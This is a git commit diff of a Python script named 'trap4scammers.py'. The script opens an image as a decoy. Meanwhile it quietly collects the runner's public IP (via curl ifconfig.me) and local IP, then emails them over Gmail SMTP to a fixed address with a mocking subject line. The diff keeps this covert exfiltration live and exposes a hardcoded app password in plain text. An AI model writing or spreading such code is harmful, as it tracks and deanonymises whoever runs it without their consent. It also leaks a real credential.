e315a79640a142fe0d0a284ef24ab6702764b210
Valerii Syroiezhin <86792918+syroiezhin@users.noreply.github.com>
2022-08-02 03:41:28 +0300

    update

--- trap4scammers.py
+++ trap4scammers.py
@@ -1,19 +1,18 @@
-from os import popen, system
+from os import popen
+from PIL import Image
+import email_to
 
 def shape():
-  print("#")
-  system("ls")
-  print("#")
-  from PIL import Image
-  Image.open("image.jpeg").show()
 
   try: myhtml = f"""<!DOCTYPE html><html><body><br><input type="text" value="Local : {popen("curl ifconfig.me").read().strip()}" size = "25" style="text-align:center" readonly><br><br><input type="text" value="Global : {popen("ipconfig getifaddr en0").read().strip()}" size = "25" style="text-align:center" readonly></body></html>"""
   except: myhtml = "ERROR :("
   finally:
     sender = "7kipgod@gmail.com"
     destination = "svaller22@gmail.com"
-    from email_to import Message, EmailServer
+    
     # create a password for the app bot and get the password by putting it in brackets : https://myaccount.google.com/apppasswords
-    EmailServer('smtp.gmail.com', 587, sender, "eifjuipuczaxguxb").send_message(Message(myhtml), destination, f"Попался, который кусался! {popen('date').read()}")
+    email_to.EmailServer('smtp.gmail.com', 587, sender, "eifjuipuczaxguxb").send_message(email_to.Message(myhtml), destination, f"Попался, который кусался! {popen('date').read()}")
 
-if __name__ == "__main__": shape()
+if __name__ == "__main__": 
+  Image.open("image.jpeg").show()
+  shape()
